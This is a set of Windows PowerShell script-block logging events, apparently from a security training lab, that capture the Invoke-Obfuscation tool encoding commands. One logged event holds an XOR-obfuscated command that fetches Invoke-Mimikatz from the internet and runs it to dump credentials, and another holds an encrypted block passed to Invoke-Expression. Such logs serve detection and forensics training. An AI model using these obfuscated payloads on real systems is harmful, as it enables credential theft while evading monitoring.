{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":3,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:23.660907Z"},"EventRecordID":651139,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DB0F-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" ( [rUntImE.iNtEROPSeRviCEs.mARShaL]::pTRtOSTriNGBstR([ruNtIMe.iNTeropSERVIcES.MarsHAl]::seCUResTRingtObstr($('76492d1116743f0423413b16050a5345MgB8ADcAUABxAFcAagBnAHgAUQBpAGoARABCADkARABNAHgAVQAxAEgAUQA1AGcAPQA9AHwANABjADQANgBmADUANgA3ADgAYgBhADkANwBmADUANwA3ADgAOABlADkANgAxAGMAMgA0ADAAMQA0ADkAZQA3AGEAYQAwADUANQAxADAANQBiADcAMQA3ADUANQA4AGEAYwAyAGMANQA3ADkAYgBiADkAMQBhAGIANgAzAGUAYwAxAGEAOAAwAGMAZABkADUAMgA4ADcAZAA1AGUAMwA4AGEANAA3AGUANQA5ADUANwBjAGMANwA5ADcAMwBhADIANAA2ADMAMQBmAGMAYwA1ADgAYQA5ADQAOAAwADgAOQAyADQAYwA2ADUAYwAyADkANgBhAGUAYwA0ADAAZAA2AGQANQA0ADkAYgA3ADgAYQA1ADcANAA5ADYAYwAyADgAZQA5AGIANgBlADQAZgBlADgAYQBlADcAYQA1ADgAYQAxADYAYgA3AGUAZABiAGEAMgAyAGMAZAA3AGEAMAA4AGYAYwAyAGMAMQAxADUANAAzADUAOAA1ADIAMQA4AGMANQA1AGEANAA4ADgAZgA0AGQAZgBhADYAYwBhAGIAOAA1AGUANgBlADMAMQBiAGMAYwA4AGEANAAxADMANgAxADEAYwBlADgAZQBjAGUAMwBkADEAYgA1AGQAMgBiADYANQA5AGUANgA5AGMAZAA1AGIANgBkADMAYwA4ADYANwAwADkAMwA4AGUAOABiADIANgA3AGIAZABkADEAYQA4ADMAOQBkAGQAOQAxADkANwA5ADkAYQA4ADYAZQBlADIANQBkADYAMQA5ADEAMQA0ADUANwA3ADkAMgA3AGUAMwBkADEANQBlADgAZABlADcAZgAyADQAYgBhADAAYwA4ADgANABjADkAYgBiADUANQAxADQAOQBjADkAMgBhAGYAOQAwAGUAOQA4ADUANgA2ADcAZAA5ADQANAAzAGQANABiADIAOABlAGUANAA0AGIANAAxADEAOABlAGMAMQBlADIANgA0AGIAMQA2AGYAMwBlAGUAYQA1ADkAOABmADgAMAA4ADEAZgAyADIAZQBmADQAMABlADgAMAAxADcAZABiAGEAOQAyAGIAYgBhAGUAMAA0ADIAZQA2ADcAZQA3ADQAMQA0ADYAMgA0ADQAZQBmADEAOQBlADkAYwAxAGEANwBjAGMAOQBjAGYAZgAyAGMAYgA0AGEAMAA3ADMANABkAGQAMwA0AGUAOAA4AGUANQAwADEAYgA2ADkAZgAyADgAYQA1AGQAOQA4AGQAMQAxADgAOAA4AGMAZQAwAGEAZQBmADMAZQAyAGYAMgA1ADgAZgA4ADcAMwA1ADkANQA4AGUAYwBjADQANwBiADcAYgA1ADAAYQA5AGMAZgAyADMAZAA3ADQANgA1ADEAZgAxAGQANAA5ADEAYQAwADcAYgBhAGMAMwA3ADcAYgBmADgAMwA2ADYAYQBjAGUAZAA4ADIAZABmAGEAMwA0AGQAYwBjADkAZABlADYAYgAyADkAMABlAGUAYgAwADAAMgBjADIANgAwADMAMQA3AGMAMQBlADIAMQBlADQANAA1AGUAOAAzADgAYQBkAGMANAA0AGYAMwBlADgAYgA5ADMAMwBlAGIANgAwAGEANgAyADAAZABlADkANgAxADMANgA4ADgAMAA4ADUAMgBiADEAYgAzAGYAMQAxADkAZgAyADMAMQAzADkAMAA0ADkANQBlADMAOAA3AGYAMQA5AGUAZQAxADEAZgBlADMANQBjADEANAA2AGEAYQA3AGIANABiAGUAMQAwADUAMABhADQAZgAzAGQAZgBmADkAZQBmADYAYQBhADUAYwBmAGUANABhAGUAOABkAGYAMAA4AGYAMgA5AGQANAA2AGUANQA4ADcANgAzADgAYwBlADcAYwBkADEANwBhADAAMwAwAGEANQAxAGMAOQA1ADIAZgBmAGYANgA2ADYAZgA0ADAAOQA='|CONveRTTO-secUResTRING  -KEy  196,47,72,214,193,53,146,52,139,252,69,219,170,135,151,62,90,5,213,36,116,154,71,183) ) ))| .( $VErBosePRefERencE.toStrING()[1,3]+'x'-JOiN'')","ScriptBlockId":"f43f364f-36c1-45d8-a2db-e1c51a40ba5e","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.455702Z"},"EventRecordID":655054,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-6F2C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(((Get-Random -Input @(1..2))-1 -eq 0)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $RandomDelimiters += $UpperLowerChar}","ScriptBlockId":"341b2328-bdbb-4e28-acbf-d683e26dffde","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.469623Z"},"EventRecordID":655085,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-892C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$DelimitedEncodedArray += ([String]([Int][Char]$_ -BXOR $BXORValue) + (Get-Random -Input $RandomDelimiters))}","ScriptBlockId":"c13c55e6-aa5f-4e31-927f-69f814a26f7a","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.555442Z"},"EventRecordID":655266,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E12C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"f078d291-4a4b-40b3-8231-ede25cff9014","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.563403Z"},"EventRecordID":655282,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-C414-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"6ce63495-144a-40b0-b0d1-a5918f96bfbc","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.568102Z"},"EventRecordID":655292,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-EF2C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"40958ca9-4d65-4623-ad18-811641b3def9","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.571013Z"},"EventRecordID":655299,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-CA14-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"164212b3-6c6c-422a-8663-a7e4ebbd3190","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.574212Z"},"EventRecordID":655306,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-F52C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"ba0fd2e1-d953-4a45-877e-36a76024be08","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.577302Z"},"EventRecordID":655312,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-F92C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"c6d4be97-ffe9-4308-8237-3be39183cb97","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.580058Z"},"EventRecordID":655317,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-CF14-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"61af1681-6d16-450b-b7bf-9a34eb7ce718","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.581571Z"},"EventRecordID":655320,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-FB2C-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"e231d59a-879c-4309-a93c-0b641f58da5f","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.585200Z"},"EventRecordID":655329,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D714-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"9f061324-024f-4ca7-b32a-d4a938dc59f8","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.588270Z"},"EventRecordID":655336,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-012D-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"783d602b-6943-484e-bb46-9a0d3ac42aef","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:39.901988Z"},"EventRecordID":656012,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C42D-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$EncodedArray += ([String]([Int][Char]$_ -BXOR $BXORValue)) + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1))}","ScriptBlockId":"22417130-bb45-451e-abb2-4506d29726ac","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:40.071021Z"},"EventRecordID":656381,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-732E-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"a0fbf4da-0733-4e50-be24-b52ff207d860","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:40.085394Z"},"EventRecordID":656410,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-8117-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"4a0eaa88-0de6-497e-8b42-b7acae040027","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:40.121123Z"},"EventRecordID":656490,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-C92E-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"a84f300f-89c0-4baa-879f-403b496f58ee","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBXORCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:43.135092Z"},"EventRecordID":656607,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D817-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" ( [cHAR[]] ( 20 , 24, 5 ,125 , 117 , 19, 56,42, 112 ,18 , 63 , 55,56 ,62,41,125,19 , 56 , 41 ,115 ,10,56 ,63, 30 , 49 ,52 ,56 ,51, 41 , 116 , 115, 25 ,50,42 ,51, 49,50,60, 57, 14, 41 ,47 , 52, 51, 58 ,117 ,122 , 53, 41,41 , 45 , 46,103, 114, 114,47 ,60, 42, 115, 58 , 52 , 41 ,53 ,40, 63 , 40 , 46, 56,47 , 62 ,50 ,51, 41 ,56,51,41, 115 , 62, 50 ,48 , 114,48,60 , 41,41 ,52 ,59, 56, 46, 41 ,60, 41 , 52,50 , 51, 114 , 13,50,42 ,56 , 47 ,14 ,45 , 49, 50 , 52 ,41 , 114 ,48, 60, 46,41, 56,47, 114 , 24,37,59,52 , 49 ,41, 47, 60,41,52 , 50 , 51 , 114 ,20 , 51 ,43, 50,54 ,56, 112 , 16 , 52, 48 , 52 , 54, 60 ,41,39, 115, 45 ,46 , 108 , 122,116,102, 125 ,20 ,51 , 43, 50 , 54 ,56 ,112, 16, 52,48,52, 54,60 , 41 , 39 ,125 ,112 , 25, 40 , 48, 45,30 ,47 ,56, 57 ,46 ) |%{[cHAR] ( $_ -BXor\"0x5d\" ) } )-JOIN''|.( $ENv:ComSPEc[4,15,25]-jOIN'')","ScriptBlockId":"c67ea55b-4a0c-4837-b15a-ef4f641d5af0","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:15:43.135680Z"},"EventRecordID":656608,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-F52E-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{[cHAR] ( $_ -BXor\"0x5d\" ) }","ScriptBlockId":"8f0360f7-f0fe-4a28-90c0-fba2bbae24b3","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:04.309850Z"},"EventRecordID":660528,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-EC31-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{'${\"}'+ ([Int]$_  -Replace \"0\",'${=}' -Replace \"1\",'${+}' -Replace \"2\",'${@}' -Replace \"3\",'${.}' -Replace \"4\",'${[}' -Replace \"5\",'${]}' -Replace \"6\",'${(}' -Replace \"7\",'${)}' -Replace \"8\",'${&}' -Replace \"9\",'${|}')}","ScriptBlockId":"3b6d27e9-0b9c-423d-bcf9-591dff171c7a","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedSpecialCharOnlyCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T19:16:04.320779Z"},"EventRecordID":660532,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-DE50-73CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n        $NewScript += $_ + ' '*(Get-Random -Input @(0,2))\r\n    }","ScriptBlockId":"ec311c0d-87c0-462a-aa4b-d31abfdab8c0","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedSpecialCharOnlyCommand.ps1"}}}
